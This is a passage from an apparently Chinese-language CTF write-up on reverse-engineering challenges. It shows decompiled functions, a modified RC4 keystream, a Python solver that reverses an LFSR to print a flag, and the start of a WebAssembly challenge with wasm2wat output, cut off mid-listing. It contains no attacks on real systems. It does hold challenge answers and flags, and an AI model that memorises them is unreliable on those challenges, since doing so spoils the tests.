i_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了10D0:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_10D0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 - <span class="number">19</span>) ^ <span class="number">0x5Au</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>笑死了，10D0直接逆向回去了，请忽略上述三个废话函数</p>
<p>需要看F10函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_F10</span><span class="params">(</span></span><br><span class="line"><span class="params">        __int64 a1,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> n8,</span></span><br><span class="line"><span class="params">        __int64 IntArrayElements,</span></span><br><span class="line"><span class="params">        <span class="type">signed</span> <span class="type">int</span> ArrayLength,</span></span><br><span class="line"><span class="params">        _DWORD *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-148h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+38h] [rbp-118h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-114h] BYREF</span></span><br><span class="line">  _BYTE v12[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_10F0(v12, <span class="number">256</span>);</span><br><span class="line">  sub_1190(v12, a1, n8);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; ArrayLength; ++i )</span><br><span class="line">    ptr[i] = sub_1280(v12, *(<span class="type">unsigned</span> <span class="type">int</span> *)(IntArrayElements + <span class="number">4LL</span> * i), &amp;v11, &amp;v10);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>10F0:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_10F0</span><span class="params">(__int64 a1, <span class="type">int</span> n256)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+8h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 ^= i;</span><br><span class="line">    *(_BYTE *)(a1 + i) = i;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1280:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1280</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> *a3, <span class="type">int</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+Fh] [rbp-25h]</span></span><br><span class="line"></span><br><span class="line">  *a3 = (*a3 + <span class="number">2</span>) % <span class="number">256</span>;</span><br><span class="line">  *a4 = (*(<span class="type">unsigned</span> __int8 *)(a1 + *a3) + *a4) % <span class="number">256</span>;</span><br><span class="line">  v5 = *(_BYTE *)(a1 + *a3);</span><br><span class="line">  *(_BYTE *)(a1 + *a3) = *(_BYTE *)(a1 + *a4);</span><br><span class="line">  *(_BYTE *)(a1 + *a4) = v5;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> __int8 *)(a1 + (*(<span class="type">unsigned</span> __int8 *)(a1 + *a4) + *(<span class="type">unsigned</span> __int8 *)(a1 + *a3) + <span class="number">2</span>) % <span class="number">256</span>) ^ a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意1280魔改了，不是标准RC4。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_variant_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="comment"># KSA: 密钥调度算法</span></span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># PRGA: 变体伪随机生成算法</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">2</span>) % <span class="number">256</span>  <span class="comment"># 变体1: 步进为 2</span></span><br><span class="line">        j = (s[i] + j) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        <span class="comment"># 变体2: 计算下标时多加了 2</span></span><br><span class="line">        idx = (s[i] + s[j] + <span class="number">2</span>) % <span class="number">256</span></span><br><span class="line">        k = s[idx]</span><br><span class="line">        res.append(val ^ k)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    </span><br><span class="line">    result2 = [<span class="number">206</span>, <span class="number">176</span>, <span class="number">51</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">30</span>, <span class="number">199</span>, <span class="number">248</span>, <span class="number">5</span>, <span class="number">103</span>, <span class="number">255</span>, <span class="number">154</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">228</span>, <span class="number">69</span>, <span class="number">190</span>, <span class="number">160</span>, <span class="number">235</span>, <span class="number">131</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">112</span>, <span class="number">22</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. Native 层逆向</span></span><br><span class="line">    key = [<span class="number">104</span>, <span class="number">115</span>, <span class="number">119</span>, <span class="number">83</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">93</span>, <span class="number">101</span>]</span><br><span class="line">    arr = rc4_variant_decrypt(result2, key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 还原为 3 个 64位 long (注意 Java 提取字节是小端序)</span></span><br><span class="line">    blocks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        val = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            val |= (arr[i * <span class="number">8</span> + j] &lt;&lt; (j * <span class="number">8</span>))</span><br><span class="line">        blocks.append(val)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 逆转 Java 层 calculate (LFSR)</span></span><br><span class="line">    poly = <span class="number">8284901391658006163</span></span><br><span class="line">    mask_msb = <span class="number">1</span> &lt;&lt; <span class="number">63</span></span><br><span class="line">    mask_64 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    final_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> blocks:</span><br><span class="line">        <span class="comment"># 逆转 64 次循环</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="comment"># 判断最低位：如果为1，说明正向最后一步发生了异或</span></span><br><span class="line">            <span class="keyword">if</span> t &amp; <span class="number">1</span>:</span><br><span class="line">                t = ((t ^ poly) &gt;&gt; <span class="number">1</span>) | mask_msb</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                t = (t &gt;&gt; <span class="number">1</span>)</span><br><span class="line">            t &amp;= mask_64</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 4. 转换回字符串</span></span><br><span class="line">        <span class="comment"># Java 的 parseLong(hex, 16) 意味着第一个字符在高位 (Big Endian)</span></span><br><span class="line">        block_hex = <span class="built_in">format</span>(t, <span class="string">&#x27;016x&#x27;</span>)</span><br><span class="line">        final_flag += <span class="built_in">bytes</span>.fromhex(block_hex).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> final_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, solve())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解码失败，请检查数据。错误信息:&quot;</span>, e)</span><br></pre></td></tr></table></figure>
<p><strong>flag{345623095654755648}</strong></p>
<ul>
<li>Wm</li>
</ul>
<blockquote>
<p>Have you heard of wasm</p>
</blockquote>
<p>高端局，第一次见wasm文件</p>
<p>wasm即WebAssembly，是一种二进制指令格式，设计用于在浏览器中高性能执行，但也常用于 CTF 的逆向题中。<br><code>.wasm</code> 文件是编译后的二进制模块，通常由 C/C++/Rust 等语言编译而来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install wabt</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm2wat challenge.wasm -o challenge.wat</span><br></pre></td></tr></table></figure>
<p>wasm2wat：将 wasm 二进制文件转为文本格式的 .wat（WebAssembly 文本格式，类似汇编）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type (;0;) (func (param i32)))</span><br><span class="line">  (type (;1;) (func))</span><br><span class="line">  (type (;2;) (func (param i32 i32) (result i32)))</span><br><span class="line">  (type (;3;) (func (param i32 i32 i32) (result i32)))</span><br><span class="line">  (type (;4;) (func (param i32 i32)))</span><br><span class="line">  (type (;5;) (func (param i32) (result i32)))</span><br><span class="line">  (type (;6;) (func (result i32)))</span><br><span class="line">  (func (;0;) (type 1)</span><br><span class="line">    nop)</span><br><span class="line">  (func (;1;) (type 2) (param i32 i32) (result i32)</span><br><span class="line">    (local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32)</span><br><span class="line">    global.get 0</span><br><span class="line">    i32.const 144</span><br><span class="line">    i32.sub</span><br><span class="line">    local.tee 7</span><br><span class="line">    global.set 0</span><br><span class="line">    block  ;; label = @1</span><br><span class="line">      local.get 1</span><br><span class="line">      i32.const 48</span><br><span class="line">      i32.gt_u</span><br><span class="line">      br_if 0 (;@1;)</span><br><span class="line">      local.get 7</span><br><span class="line">      i32.const 128</span><br><span class="line">      i32.add</span><br><span class="line">      local.set 8</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 3</span><br><span class="line">        i32.const 8</span><br><span class="line">        i32.ne</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          local.get 3</span><br><span class="line">          local.get 8</span><br><span class="line">          i32.add</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1024</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1040</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 255</span><br><span class="line">          i32.and</span><br><span class="line">          call 2</span><br><span class="line">          i32.store8</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 3</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      i32.const 8</span><br><span class="line">      local.set 3</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 3</span><br><span class="line">        i32.const 16</span><br><span class="line">        i32.ne</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          local.get 3</span><br><span class="line">          local.get 8</span><br><span class="line">          i32.add</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1024</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1040</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 255</span><br><span class="line">          i32.and</span><br><span class="line">          call 2</span><br><span class="line">          i32.store8</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 3</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span 